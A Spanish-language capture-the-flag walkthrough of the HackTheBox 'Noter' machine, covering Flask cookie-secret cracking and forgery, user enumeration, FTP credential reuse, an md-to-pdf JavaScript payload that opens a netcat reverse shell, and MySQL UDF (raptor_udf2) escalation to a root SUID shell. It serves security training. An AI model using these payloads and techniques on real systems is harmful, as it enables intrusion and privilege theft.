# Máquina "Noter" de HackTheBox

## Características

- Information Leakage 
- User Enumeration [Brute-Force Wfuzz] Finding valid users 
- Wfuzz SSTI (Server Side Template Injection) [Failed] 
- JWT Enumeration Abusing JWT 
- Flask-Unsign Cracking Flask Cookie Secret 
- Flask-Unsign Cookie Hijacking 
- FTP Enumeration 
- Information Leakage in PDF document 
- Finding a command injection in the web RCE in md-to-pdf 4.1.0 
- Abusing the vulnerable code definition 
- Alternative Command Injection (RCE) Abusing MYSQL service running as the root user [Privilege Escalation] (raptor_udf2.so)
- MySQL
- Flask token
- FTP

## Útil en

- eWPT 
- eWPTXv2 
- OSWE 
- OSCP

**IP:** 10.10.11.160

## Reconocimiento

Comenzamos con un escaneo de puertos usando nmap:

```bash
nmap -sV -p- -oA 10.10.11.160 10.10.11.160
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos 3 puertos abiertos: SSH, FTP y un servidor web ejecutándose en el puerto 5000. Accedamos al servidor web en el puerto 5000 desde un navegador web.

No pudimos entrar por el puerto 21 FTP, así que intentaremos cuando tengamos credenciales.

![Página web inicial](/secciones/posts/imagenes/noter/webpage1.png)

Los enlaces "Inicio" y "Notas" simplemente redirigen a /login. Intentamos iniciar sesión con credenciales por defecto sin resultados. Vamos a la sección "Registrarse" y podemos entrar. Da mensajes distintos si cambiamos usuarios y ponemos credenciales correctas, lo que significa que podríamos sacar usuarios existentes por fuerza bruta.

![Dashboard](/secciones/posts/imagenes/noter/dashboard1.webp)

## Análisis de la Aplicación Web

Al iniciar sesión, tenemos una sesión válida con una cookie. Verifiquemos si después de iniciar sesión podemos ver más directorios y encontrar otros archivos útiles.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://10.129.173.105:5000/FUZZ -H "Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiamF5ZGVuIn0.YonraA.yW130NmEJTMGWTMRAaJeW5JTL8c"
```

```
register                [Status: 200, Size: 2646, Words: 523, Lines: 95, Duration: 247ms]
login                   [Status: 200, Size: 1967, Words: 427, Lines: 67, Duration: 277ms]
logout                  [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 234ms]
dashboard               [Status: 200, Size: 2361, Words: 560, Lines: 83, Duration: 220ms]
notes                   [Status: 200, Size: 1703, Words: 388, Lines: 61, Duration: 224ms]
VIP                     [Status: 200, Size: 1742, Words: 398, Lines: 58, Duration: 225ms]
```

Estas páginas ya se pueden navegar con solo iniciar sesión, por lo que no hay nada nuevo aquí.

## Análisis de Cookies Flask

Al inspeccionar la cookie de sesión, tiene el formato de JWT. Probémoslo en https://jwt.io para validar si es un JWT válido.

![JWT Analysis](/secciones/posts/imagenes/noter/jwt1.png)

No es un JWT válido, pero casi sigue el mismo formato, con la cadena antes del primer "." estar codificada en base64. Volviendo a ver qué servicio se identificó en el puerto 5000, que es **Werkzeug**, busquemos qué tipos de cookies puede generar Werkzeug.

Después de investigar, descubrimos que el tipo de cookie es utilizado por Flask. Esta cookie está firmada con una clave secreta que se almacena en la clase `app.config`. Si pudiéramos forzar la clave secreta por fuerza bruta, podríamos falsificar nuestra propia cookie con cualquier nombre de usuario y obtener acceso a las notas de otros usuarios.

## Crackeando la Clave Secreta de Flask

Usando [flask-unsign](https://pypi.org/project/flask-unsign/), podemos forzar la clave "secreta" por fuerza bruta:

```bash
flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiamF5ZGVuIn0.Yn0P8Q.XaXAKhvjJ6uPpxdUw1V0KPitAW8'
```

```
[*] Session decodes to: {'logged_in': True, 'username': 'jayden'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2048): -----BEGIN PRIVATE KEY-----***
[+] Found secret key after 16768 attempts
'secret123'
```

Luego confirmé que esta era la clave secreta para firmar cookies, generando mi propia cookie nuevamente y confirmando que aún podía iniciar sesión:

```bash
flask-unsign --sign --cookie "{'logged_in': True, 'username' :'admin'}" --secret secret123
```

```
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YoIo2Q.spOR6sUSMWZOX5_xKq9iiwkfTFk
```

## Enumeración de Usuarios

Con esto ahora podemos comenzar a forzar los nombres de usuario. Script para enumerar nombres de usuario válidos:

```python
import sys
import requests

filename = sys.argv[1]
url = 'http://10.10.11.160:5000/login'
proxies = {'http':'http://127.0.0.1:8080'}

with open(filename) as file:
    lines = file.readlines()
    lines = [line.rstrip() for line in lines]
    
    for line in lines:
        data = {'username':line, 'password':'1234'}
        x = requests.post(url, data, proxies=proxies)
        if("Invalid login" in x.text):
            print(line)
```

Después de lanzarlo, me da como salida el usuario **blue**.

Las cookies de Flask están firmadas con un secreto, por lo que no se pueden modificar sin conocer ese secreto. Es posible realizar un ataque de fuerza bruta para comprobar si hay un secreto débil y `flask-unsign` proporciona esa capacidad.

Ejecutándolo con `rockyou.txt` devuelve un error inicialmente, pero usando `--no-literal-eval` funciona:

```bash
flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiMHhkZiJ9.YkOi3w.izn9BJ3ifHAo0BAfnrWr3EW6Nuc' -w /usr/share/wordlists/rockyou.txt --no-literal-eval
```

```
[*] Session decodes to: {'logged_in': True, 'username': 'test'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17024 attempts
b'secret123'
```

Ahora, usaré `flask-unsign` para hacer una cookie con el usuario encontrado:

```bash
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret secret123
```

```
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YkRUJg.-0B60ZY6aQyHOSoCxBnWGOx-Rbw
```

Reemplazando la cookie actual en las herramientas de desarrollo de Firefox y luego recargando `/dashboard` muestra que ahora estoy conectado como **blue**:

![Usuario Blue](/secciones/posts/imagenes/noter/blue1.webp)

## Acceso a Notas del Usuario Blue

Ahora si miramos las notas podremos ver la siguiente información:

```
Written by ftp_admin on Mon Dec 20 01:52:32 2021

Hello, Thank you for choosing our premium service. Now you are capable of
doing many more things with our application. All the information you are going
to need are on the Email we sent you. By the way, now you can access our FTP
service as well. Your username is 'blue' and the password is 'blue@Noter!'.
Make sure to remember them and delete this.  
(Additional information are included in the attachments we sent along the
Email)  

We all hope you enjoy our service. Thanks!  

ftp_admin
```

## Acceso FTP

Ahora podemos iniciar sesión en el servidor FTP con el usuario **blue**:

```bash
ftp 10.10.11.160
```

```
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:jayden): blue
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf
226 Directory send OK.
```

Tras descargar `policy.pdf`, nos indica las políticas de contraseñas de la organización. En la línea 4 "Creación de contraseña", indica:

> 1. Default user-password generated by the application is in the format of "username@site_name!" (This applies to all your applications)

El otro nombre de usuario que obtuvimos fue el de la nota, "ftp_admin". Esto haría que la contraseña ftp_admin predeterminada fuera "ftp_admin@Noter!". Probemos esto en el servidor FTP.

```bash
ftp 10.10.11.160
```

```
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:jayden): ftp_admin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip
226 Directory send OK.
```

¡Efectivamente funciona! Descarguemos estos archivos ZIP, ya que parecen ser el código fuente de este servidor.

## Análisis del Código Fuente

En `app_backup_1635803546.zip/app.py` podemos ver las credenciales de MySQL codificadas en el archivo:

```bash
cat app.py | grep -i mysql
```

```
from flask_mysqldb import MySQL
# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
```

Al explorar el código fuente `app_backup_1638395546.zip`, encontramos que se implementa la función de exportación de markdown a PDF e importación de markdown a PDF. Utiliza la biblioteca `md-to-pdf` para lograr esta función.

## Explotación de md-to-pdf (CVE-2021-23639)

La búsqueda de CVE para `md-to-pdf` nos lleva a **CVE-2021-23639**, que nos permite tener RCE. Para aprovechar esto, necesitamos utilizar la función "Exportar directamente desde la nube" de la sección VIP. Esto solo es visible si estás conectado como usuario "blue", ya que los usuarios normales no tienen "VIP".

![Export function](/secciones/posts/imagenes/noter/export1.png)

Para obtener RCE con éxito, necesitamos que la función "Exportar directamente desde la nube" apunte a un archivo de markdown que controlamos. Esto es fácil de lograr ejecutando un servidor web simple en el puerto 80 y apuntando la función "Exportar directamente desde la nube" a nuestra máquina local.

Creé el siguiente payload en un archivo llamado `payload.md`:

```markdown
---js
((require("child_process")).execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f"))
---RCE
```

Iniciaré un servidor web Python y un listener de netcat y enviar `http://10.10.14.6/payload.md` a Noter. Hay una conexión en el servidor web y luego una conexión en nc:

```bash
nc -lnvp 443
```

Configuramos la shell:

```bash
script /dev/null -c bash
# Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```

Y podemos buscar la flag de usuario.

## Escalada de Privilegios

No hay mucho de interés en el directorio de inicio del usuario. La aplicación web parece estar ejecutándose desde `/app`, pero ya tuve acceso a ese código fuente. La fuente en vivo muestra las nuevas credenciales de MySQL:

```python
# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'DB_user'
app.config['MYSQL_PASSWORD'] = 'DB_password'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
```

`/opt` tiene un solo archivo, `backup.sh`:

```bash
svc@noter:/opt$ ls
backup.sh
```

Esto parece ser lo que creó las copias de seguridad que encontré a través de FTP, pero claramente no se ejecuta con frecuencia.

Ejecutar `ps auxww` no proporciona ningún proceso excepto los propiedad de svc.

Nada interesante ahí. `/proc` está montado con `hidepid=2`. Para ver qué más podría estar ejecutándose, miraré `/etc/systemd` para buscar servicios. Comenzaré con MySQL, ya que sé que se está ejecutando:

```bash
find . -name '*.service' | grep sql
```

```
./system/multi-user.target.wants/mysqlcheck.service
./system/multi-user.target.wants/mysql-start.service
./system/mysqlcheck.service
./system/mysql-start.service
```

`mysql-start.service` muestra que el servicio se está ejecutando como root:

```ini
[Unit]
Description=MySQL service

[Service]
ExecStart=/usr/sbin/mysqld
User=root
Group=root

[Install]
WantedBy=multi-user.target
```

## Explotación de MySQL como Root

Hay muchas publicaciones sobre cómo explotar MySQL ejecutándose como root usando un código denominado "Raptor". La idea es escribir una biblioteca compartida que ejecute comandos desde SQL en el directorio de complementos y luego agregar un comando para acceder a ella y ejecutarla como root.

Necesitaré obtener una copia del archivo exploit y compilarlo:

```bash
wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Ahora lo subiré a Noter en `/dev/shm`.

### Cargando la Biblioteca

Me conectaré a MySQL como root, no como DB_user (ese usuario carece de privilegios), y usaré la base de datos `mysql`:

```bash
mysql -u root -pNildogg36 mysql
```

Voy a crear una tabla `foo` y leer el binario en ella:

```sql
MariaDB [mysql]> CREATE TABLE foo(line BLOB);
Query OK, 0 rows affected (0.007 sec)

MariaDB [mysql]> INSERT INTO foo VALUES(LOAD_FILE('/dev/shm/raptor_udf2.so'));
Query OK, 1 row affected (0.002 sec)
```

Lo siguiente que necesito saber es el directorio de complementos:

```sql
MariaDB [mysql]> SHOW VARIABLES LIKE '%plugin%';
```

```
+-----------------+---------------------------------------------+
| Variable_name   | Value                                       |
+-----------------+---------------------------------------------+
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| plugin_maturity | gamma                                       |
+-----------------+---------------------------------------------+
2 rows in set (0.001 sec)
```

Escribiré ese binario en el directorio de complementos de arriba y lo cargaré como una función definida por el usuario:

```sql
MariaDB [mysql]> SELECT * FROM foo INTO DUMPFILE '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'; 
Query OK, 1 row affected (0.000 sec)

MariaDB [mysql]> CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
Query OK, 0 rows affected (0.001 sec)
```

Para probarlo, usaré la función para ejecutar `id` y escribir el resultado en un archivo:

```sql
MariaDB [mysql]> SELECT do_system('id > /dev/shm/test; chmod 777 /dev/shm/test');
```

```
+----------------------------------------------------------+
| do_system('id > /dev/shm/test; chmod 777 /dev/shm/test') |
+----------------------------------------------------------+
|                                                        0 |
+----------------------------------------------------------+
1 row in set (0.005 sec)
```

La salida en MySQL no es útil, pero el archivo está ahí y fue ejecutado por root:

```bash
svc@noter:/dev/shm$ ls -l test 
-rwxrwxrwx 1 root root 39 Mar 30 21:08 test
svc@noter:/dev/shm$ cat test 
uid=0(root) gid=0(root) groups=0(root)
```

### Obteniendo Shell de Root

Para conseguir un shell de root, volveré a MySQL a copiar el `bash` para que sea SUID:

```sql
MariaDB [mysql]> SELECT do_system('cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash');
```

```
+-----------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash') |
+-----------------------------------------------------------+
|                                                         0 |
+-----------------------------------------------------------+
1 row in set (0.006 sec)
```

Necesitaré encontrar un lugar para trabajar que no sea `/dev/shm`, ya que está montado `nosuid`:

```bash
svc@noter:/dev/shm$ mount | grep shm
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
```

`/tmp` funcionará bien.

Como `bash` elimina privilegios, ejecutar esto devolverá un shell no root, pero ejecutar con `-p` dará root:

```bash
svc@noter:/dev/shm$ /tmp/rootbash -p
```

```
rootbash-5.0# id
uid=1001(svc) gid=1001(svc) euid=0(root) groups=1001(svc)
```

Ahora podemos leer `root.txt`.

---

## Nota

Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto debido a que en algunas de las máquinas que realicé, no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno.